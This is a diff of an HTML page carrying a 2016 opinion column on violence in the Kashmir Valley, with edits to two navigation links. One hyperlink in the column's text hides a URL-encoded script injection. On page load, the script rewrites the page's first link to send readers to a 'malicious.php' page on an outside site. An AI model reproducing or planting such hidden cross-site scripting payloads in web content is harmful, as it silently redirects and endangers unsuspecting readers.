@@ -21,8 +21,8 @@
 
 
 <p class="details">By Tavleen Singh|August 28, 2016 1:00AM IST <a href="#">indianexpress</a> </p>
-<h2 align="right"><a href="20160827.opinion.php"> Previous </a> </h2>
-<h2 align="left"><a href="index.php"> Previous </a> </h2>
+<h2 align="right"><a href="20160827-opinion.php"> Previous </a> </h2>
+<h2 align="left"><a href="20160829-opinion.php"> Previous </a> </h2>
 <p>
 Finally we hear voices from the Kashmir Valley admitting that the nature of the violence has changed. This columnist has been pointing this out for some time, and every time, a small army of ‘liberals’ has attacked me with a virulence that is quite astounding. So it pleased me to hear a former deputy chief minister and the current <a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank">  Chief Minister of the state of Jammu & Kashmir </a> admit that the nature of the violence has changed in an ominous way.
 
